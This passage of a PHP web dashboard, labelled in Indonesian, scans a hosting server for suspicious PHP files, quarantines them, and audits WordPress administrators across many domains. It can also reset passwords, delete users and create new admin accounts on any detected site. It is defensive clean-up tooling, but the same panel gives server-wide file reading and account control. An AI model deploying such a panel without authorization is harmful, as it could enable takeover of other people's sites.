                'total' => count($domains), 'finished' => $offset + count($batch) >= count($domains)]);
        }

        if ($action === 'admin_audit') {
            $site = (string)($_POST['site'] ?? '');
            jsonResponse(['users' => wpAdminAudit($site)]);
        }

        if ($action === 'create_verified_admin') {
            jsonResponse(cleanerCreateVerifiedAdmin(
                (string)($_POST['site'] ?? ''),
                (string)($_POST['new_username'] ?? ''),
                (string)($_POST['new_email'] ?? ''),
                (string)($_POST['new_password'] ?? '')
            ));
        }

        if ($action === 'admin_action') {
            $site = (string)($_POST['site'] ?? '');
            $id = (int)($_POST['user_id'] ?? 0);
            $operation = (string)($_POST['operation'] ?? '');
            $confirm = (string)($_POST['confirm_username'] ?? '');
            $password = (string)($_POST['new_password'] ?? '');
            $reassign = (int)($_POST['reassign_id'] ?? 0);
            jsonResponse(wpAdminAction($site, $id, $operation, $confirm, $password, $reassign));
        }

        if ($action === 'view_source') {
            $path = (string)($_POST['path'] ?? '');
            checkedResult($db, $path);
            $size = @filesize($path);
            if ($size === false || $size > 1048576) {
                jsonResponse(['error' => 'File terlalu besar untuk pratinjau (maksimal 1 MB)']);
            }
            $source = @file_get_contents($path);
            if ($source === false) throw new RuntimeException('Tidak dapat membaca file');
            jsonResponse(['source' => $source, 'sha256' => hash_file('sha256', $path)]);
        }

        if ($action === 'delete_file') {
            $path = (string)($_POST['path'] ?? '');
            checkedResult($db, $path);
            // Hapus hanya file yang sebelumnya dikarantina oleh dashboard ini.
            // Tidak menghapus file aktif langsung karena false positive bisa merusak situs.
            jsonResponse(['error' => 'Untuk keselamatan, karantina file dahulu. Hapus permanen lewat File Manager setelah diperiksa.']);
        }

        if ($action === 'quarantine') {
            $path = (string)($_POST['path'] ?? '');

            $stmt = $db->prepare(
                'SELECT path FROM results WHERE path=?'
            );
            $stmt->execute([$path]);

            if (!$stmt->fetchColumn()) {
                jsonResponse(['error' => 'File tidak ada dalam hasil scan']);
            }

            if (
                !in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), ['php'], true) ||
                is_link($path) ||
                !is_file($path) ||
                !allowedPath($path)
            ) {
                jsonResponse([
                    'error' => 'Hanya file PHP hasil scan yang dapat dikarantina'
                ]);
            }

            $destination = $path .
                '.quarantine-' . bin2hex(random_bytes(6));

            if (!@rename($path, $destination)) {
                jsonResponse([
                    'error' => 'Karantina gagal. Periksa permission.'
                ]);
            }

            $stmt = $db->prepare(
                'DELETE FROM results WHERE path=?'
            );
            $stmt->execute([$path]);

            jsonResponse([
                'success' => true,
                'destination' => $destination
            ]);
        }

        jsonResponse(['error' => 'Action tidak dikenal']);

    } catch (Throwable $e) {
        cleanerDebugLog('AJAX EXCEPTION ' . get_class($e) . ': ' . $e->getMessage() . ' at ' . $e->getFile() . ':' . $e->getLine() . PHP_EOL . $e->getTraceAsString());
        cleanerDebugLog('AJAX EXCEPTION ' . get_class($e) . ': ' . $e->getMessage());
        http_response_code(500);
        jsonResponse(['error' => 'Kesalahan server. Periksa cleaner-debug.txt.']);
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Server PHP Cleaner</title>
<style>
body {
    font-family: Arial,sans-serif;
    background:#151923;
    color:#e5e7eb;
    padding:24px;
}
main {max-width:1100px;margin:auto}
section {
    background:#222938;
    border-radius:10px;
    padding:20px;
    margin:15px 0;
}
button,select,input {
    padding:10px;
    border-radius:6px;
    margin:5px;
}
button {
    background:#2563eb;
    color:white;
    border:0;
    cursor:pointer;
}
button:disabled {opacity:.45}
.danger {background:#b91c1c}
.file {
    padding:12px;
    border-bottom:1px solid #475569;
    overflow-wrap:anywhere;
}
small {color:#a5b4c5}
#status {font-weight:bold}
</style>
</head>
<body>
<main>
<h2>Server PHP Cleaner</h2>
<p>Root aktif: <strong id="activeRoot"><?= h(activeRoot()) ?></strong></p>
<a href="?logout=1" style="color:#93c5fd">Logout</a>

<section>
<h3>Pengaturan Pemindaian</h3>
<p><small>Pilih root hasil deteksi atau masukkan path manual yang berada dalam direktori yang diizinkan.</small></p>
<select id="rootOptions" style="max-width:95%"></select>
<input id="manualRoot" style="width:min(95%,560px)" placeholder="Root manual, misalnya /home/user/domains">
<button onclick="saveRoot()">Gunakan Root</button>
<button onclick="loadRoots()">Deteksi Ulang</button>

<select id="mode">
<option value="target">Cari wp-post.php</option>
<option value="recent">Cari PHP baru yang mencurigakan (heuristik)</option>
</select>

<select id="days">
<option value="1">24 jam terakhir</option>
<option value="7" selected>7 hari terakhir</option>
<option value="30">30 hari terakhir</option>
</select>

<button id="start" onclick="startScan()">Mulai Scan</button>
<button id="resume" onclick="resumeScan()">Lanjutkan Scan</button>
<button onclick="loadResults()">Refresh Hasil</button>
</section>

<section>
<h3>Status</h3>
<p id="status">Siap</p>
<p>Folder diperiksa: <b id="scanned">0</b></p>
<p>Antrean: <b id="pending">0</b></p>
<p>File ditemukan: <b id="found">0</b></p>
<p>Kesalahan: <b id="errors">0</b></p>
</section>

<section>
<h3>File Ditemukan (hasil tampil selama scanning)</h3>
<p><small>Deteksi berdasarkan pola berisiko, bukan kepastian infeksi. Buka kode sumber dahulu; membuka file PHP lewat URL dapat mengeksekusinya.</small></p>
<div id="results">Belum ada hasil.</div>
</section>
<section>
<h3>Audit & Tindakan Administrator WordPress</h3>
<p>Root audit aktif: <strong id="activeAuditRoot"><?= h(auditRoot()) ?></strong></p>
<select id="auditRootOptions" style="max-width:95%"></select>
<input id="manualAuditRoot" style="width:min(95%,560px)" placeholder="Root audit manual, contoh /home/thetamed/public_html">
<button onclick="saveAuditRoot()">Gunakan Root Audit</button>
<button onclick="loadAuditRoots()">Deteksi Root Audit</button>
<p>Masukkan path WordPress. Tindakan hanya per akun dan memerlukan konfirmasi username. Buat backup database terlebih dahulu.</p>
<input id="site" style="width:min(95%,680px)" placeholder="/home/u542766256/domains/domain.com/public_html">
<button onclick="auditAdmins()">Periksa Administrator</button>
<button onclick="globalAuditAdmins()">Audit Global Semua Domain</button>
<button onclick="createVerifiedAdmin()">Create Administrator (Situs Dipilih)</button>
<p><small>Audit pertama membuat baseline. Audit berikutnya mendeteksi ID administrator baru dan mengirim Telegram jika konfigurasi bot tersedia. Tidak mengambil password pengguna.</small></p>
<p id="globalAuditStatus"></p>
<div id="globalAuditResults"></div>
<pre id="adminResults" style="white-space:pre-wrap;overflow-wrap:anywhere">Belum diperiksa.</pre>
</section>
</main>

<script>
const csrf = <?= json_encode($_SESSION['csrf']) ?>;
let running = false;
let lastResultCount = -1;
async function loadRoots() {
    try {
        const data = await api('roots');
        const select = document.getElementById('rootOptions');
        select.replaceChildren();
        for (const root of data.roots) {
            const option = new Option(root, root);
            select.add(option);
        }
        select.value = data.selected;
        document.getElementById('activeRoot').textContent = data.selected;
    } catch (e) { status('Gagal deteksi root: ' + e.message); }
}
async function saveRoot() {
    if (running) return alert('Tunggu pemindaian selesai.');
    const root = document.getElementById('manualRoot').value.trim() || document.getElementById('rootOptions').value;
    try {
        const data = await api('set_root', {root});
        document.getElementById('activeRoot').textContent = data.root;
        document.getElementById('manualRoot').value = '';
        await loadRoots();
        status('Root aktif diganti. Siap memindai.');
    } catch (e) { alert('Gagal memilih root: ' + e.message); }
}
window.addEventListener('DOMContentLoaded', loadRoots);

async function loadAuditRoots() {
    try {
        const data = await api('audit_roots');
        const select = document.getElementById('auditRootOptions');
        select.replaceChildren();
        for (const root of data.roots) select.add(new Option(root, root));
        if (![...select.options].some(o => o.value === data.selected)) select.add(new Option(data.selected, data.selected));
        select.value = data.selected;
        document.getElementById('activeAuditRoot').textContent = data.selected;
    } catch (e) { status('Gagal mendeteksi root audit: ' + e.message); }
}
async function saveAuditRoot() {
    const root = document.getElementById('manualAuditRoot').value.trim() || document.getElementById('auditRootOptions').value;
    try {
        const data = await api('set_audit_root', {root});
        document.getElementById('activeAuditRoot').textContent = data.root;
        document.getElementById('manualAuditRoot').value = '';
        document.getElementById('site').value = '';
        await loadAuditRoots();
        status('Root audit WordPress diperbarui.');
    } catch (e) { alert('Gagal memilih root audit: ' + e.message); }
}
window.addEventListener('DOMContentLoaded', loadAuditRoots);

async function api(action, extra = {}) {
    const body = new URLSearchParams({
        action,
        csrf,
        ...extra
    });

    const controller = new AbortController();
    const timeout = setTimeout(
        () => controller.abort(),
        12000
    );

    try {
        const response = await fetch(location.pathname, {
            method: 'POST',
            body,
            signal: controller.signal,
            cache: 'no-store'
        });

        const result = await response.json();

        if (!response.ok || result.error) {
            throw new Error(result.error || 'HTTP ' + response.status);
        }

        return result;
    } finally {
        clearTimeout(timeout);
    }
}

function status(text) {
    document.getElementById('status').textContent = text;
}

async function startScan() {
    if (running) return;

    try {
        await api('start', {
            mode: document.getElementById('mode').value,
            days: document.getElementById('days').value
        });

        await resumeScan();
    } catch (e) {
        status('Error: ' + e.message);
    }
}


async function resumeScan() {
    if (running) return;

    running = true;

    const startBtn = document.getElementById('start');
    const resumeBtn = document.getElementById('resume');

    startBtn.disabled = true;
    resumeBtn.disabled = true;

    let retryCount = 0;

    try {
        while (running) {
            try {
                const data = await api('scan');

                retryCount = 0;

                for (const key of [
                    'scanned',
                    'pending',
                    'found',
                    'errors'
                ]) {
                    document.getElementById(key).textContent = data[key];
                }

                status(
                    data.finished
                        ? 'Scanning selesai'
                        : 'Scanning otomatis berjalan...'
                );

                if (data.found !== lastResultCount) {
                    lastResultCount = data.found;

                    try {
                        await loadResults();
                    } catch (e) {
                        console.warn(e);
                    }
                }

                if (data.finished) {
                    break;
                }

                await new Promise(resolve =>
                    setTimeout(resolve, 250)
                );

            } catch (e) {
                retryCount++;

                const delay = Math.min(
                    1000 * Math.pow(2, Math.min(retryCount - 1, 4)),
                    15000
                );

                status(
                    'Koneksi terputus. Auto Resume aktif. ' +
                    'Percobaan ulang ke-' + retryCount +
                    ' dalam ' + (delay / 1000) + ' detik.'
                );

                await new Promise(resolve =>
                    setTimeout(resolve, delay)
                );
            }
        }

        if (running) {
            await loadResults();
        }

    } finally {
        running = false;
        startBtn.disabled = false;
        resumeBtn.disabled = false;
    }
}


async function globalAuditAdmins() {
    const box = document.getElementById('globalAuditResults');
    const progress = document.getElementById('globalAuditStatus');
    box.replaceChildren();
    let offset = 0;
    try {
        while (true) {
            const data = await api('global_admin_audit', {offset:String(offset)});
            for (const item of data.sites) {
                const section = document.createElement('div');
                section.className = 'file';
                const heading = document.createElement('strong');
                heading.textContent = item.domain + (item.error ? ' — GAGAL: ' + item.error : ' — ' + item.users.length + ' administrator' + (item.new_admins ? ' — BARU: ' + item.new_admins : ''));
                section.append(heading);
                if (item.users) {
                    for (const user of item.users) {
                        const row = document.createElement('div');
                        row.textContent = `ID ${user.ID} | ${user.user_login} | ${user.user_email} | ${user.user_registered}`;
                        section.append(row);
                    }
                    const button = document.createElement('button');
                    button.textContent = 'Pilih situs untuk tindakan per akun';
                    button.onclick = () => {
                        document.getElementById('site').value = item.site;
                        auditAdmins();
                    };
                    section.append(button);
                    const createBtn = document.createElement('button');
                    createBtn.textContent = 'Create Administrator';
                    createBtn.onclick = () => { document.getElementById('site').value = item.site; createVerifiedAdmin(); };
                    section.append(createBtn);
                }
                box.append(section);
            }
            offset = data.next;
            progress.textContent = `Domain diperiksa: ${offset} / ${data.total}`;
            if (data.finished) break;
        }
        progress.textContent += ' — audit selesai.';
    } catch (e) {
        progress.textContent = 'Audit terhenti: ' + e.message + '. Hasil yang sudah ditemukan tetap tampil.';
    }
}

async function createVerifiedAdmin() {
    const site = document.getElementById('site').value.trim();
    if (!site) return alert('Pilih situs WordPress dahulu.');
    const new_username = prompt('Username administrator baru:');
    if (!new_username) return;
    const new_email = prompt('Email administrator baru:');
    if (!new_email) return;
    const new_password = prompt('Password administrator baru (minimal 16 karakter, berbeda dari password Cleaner):');
    if (!new_password) return;
    if (!confirm('Buat administrator baru hanya pada situs ini?\n' + site)) return;
    try {
        const result = await api('create_verified_admin', {site, new_username, new_email, new_password});
        alert(result.message + '\nNotifikasi Telegram: ' + (result.notified ? 'terkirim' : 'belum terkirim / belum dikonfigurasi') + '\nLogin: ' + result.login_url + '\nSimpan password baru di password manager.');
        await auditAdmins();
    } catch (e) { alert('Gagal: ' + e.message); }
}

async function auditAdmins() {
    const box = document.getElementById('adminResults');
    box.replaceChildren();  
    box.textContent = 'Memeriksa database WordPress...';
    try {
        const site = document.getElementById('site').value.trim();
        const data = await api('admin_audit', {site});
        box.replaceChildren();
        if (!data.users.length) {
            box.textContent = 'Tidak ada administrator terdeteksi dalam tabel utama.';
            return;
        }
        for (const u of data.users) {
            const line = document.createElement('div');
            line.className = 'file';
            const info = document.createElement('div');
            info.textContent = `ID: ${u.ID} | ${u.user_login} | ${u.user_email} | Terdaftar: ${u.user_registered}`;
            line.append(info);
            for (const [label, operation] of [['Reset Password','reset_password'], ['Cabut Admin','revoke_admin'], ['Hapus User','delete_admin']]) {
                const btn = document.createElement('button');
                btn.textContent = label;
                if (operation !== 'reset_password') btn.className = 'danger';
                btn.onclick = async () => {
                    const confirmUsername = prompt('Ketik username persis untuk konfirmasi tindakan pada ' + u.user_login + ':');
                    if (confirmUsername !== u.user_login) return;
                    let newPassword = '';
                    let reassignId = '0';
                    if (operation === 'reset_password') {
                        newPassword = prompt('Masukkan password baru (minimal 16 karakter):') || '';
                        if (newPassword.length < 16) return alert('Password minimal 16 karakter.');
                    }
                    if (operation === 'delete_admin') {
                        reassignId = prompt('Masukkan ID user sah yang menerima semua artikel milik akun ini:') || '0';
                        if (!/^\d+$/.test(reassignId) || Number(reassignId) < 1 || Number(reassignId) === Number(u.ID)) return alert('ID penerima tidak valid.');
                    }
                    if (!confirm('Konfirmasi tindakan ' + label + ' pada ' + u.user_login + ' (ID ' + u.ID + ')?')) return;
                    btn.disabled = true;
                    try {
                        const result = await api('admin_action', {site, user_id:String(u.ID), operation, confirm_username:confirmUsername, new_password:newPassword, reassign_id:reassignId});
                        alert(result.message);
                        await auditAdmins();
                    } catch (e) { alert('Gagal: ' + e.message); btn.disabled = false; }
                };
                line.append(btn);
            }
            box.append(line);
        }
    } catch (e) {
        box.textContent = 'Audit gagal: ' + e.message;
    }
}

async function loadResults() {
    try {
        const data = await api('results');
        const box = document.getElementById('results');
        box.replaceChildren();

        if (!data.files.length) {
            box.textContent = 'Belum ada file ditemukan.';
            return;
        }

        for (const file of data.files) {
            const div = document.createElement('div');
            div.className = 'file';

            const path = document.createElement('div');
            path.textContent = file.path;

            const date = document.createElement('small');
            date.textContent = 'Dimodifikasi: ' +
                new Date(file.modified * 1000).toLocaleString();

            div.append(path, date);

            const detail = document.createElement('small');
            detail.textContent = ` | ${file.size} byte | Indikasi: ${(file.reasons || []).join(', ') || 'perlu tinjauan'}`;
            div.append(detail);

            const view = document.createElement('button');
            view.textContent = 'Lihat Kode (aman)';
            view.onclick = async () => {
                try {
                    const result = await api('view_source', {path:file.path});
                    const pre = document.createElement('pre');
                    pre.style.cssText = 'white-space:pre-wrap;overflow-wrap:anywhere;max-height:450px;overflow:auto;background:#111827;padding:12px';
                    pre.textContent = `SHA256: ${result.sha256}\n\n${result.source}`;
                    const old = div.querySelector('pre');
                    if (old) old.remove();
                    div.append(pre);
                } catch(e) { alert(e.message); }
            };
            div.append(view);

            if (file.url) {
                const open = document.createElement('button');
                open.textContent = 'Buka PHP di Browser (berisiko)';
                open.onclick = () => {
                    if (confirm('PERINGATAN: URL PHP akan MENJALANKAN script di server. Jangan buka jika diduga webshell. Tetap lanjut?')) {
                        window.open(file.url, '_blank', 'noopener,noreferrer');
                    }
                };
                div.append(open);
            }

            const quarantine = document.createElement('button');
            quarantine.className = 'danger';
            quarantine.textContent = 'Karantina / Nonaktifkan';
            quarantine.onclick = async () => {
                if (!confirm('Karantina file ini? Pastikan bukan bagian aplikasi sah.\n' + file.path)) return;
                quarantine.disabled = true;
                try {
                    const result = await api('quarantine', {path:file.path});
                    alert('File dikarantina ke:\n' + result.destination + '\nHapus permanen setelah diverifikasi melalui File Manager.');
                    await loadResults();
                } catch(e) { alert(e.message); quarantine.disabled = false; }
            };
            div.append(quarantine);

            const del = document.createElement('button');
            del.className = 'danger';
            del.textContent = 'Hapus';
            del.title = 'Karantina dahulu, lalu hapus permanen via File Manager';
            del.onclick = () => alert('Untuk menghindari kehilangan file sah, gunakan Karantina dahulu, kemudian hapus permanen lewat File Manager setelah diverifikasi.');
            div.append(del);

            box.append(div);
        }
    } catch (e) {
        status('Gagal memuat hasil: ' + e.message);
    }
}
</script>
</body>
</html>
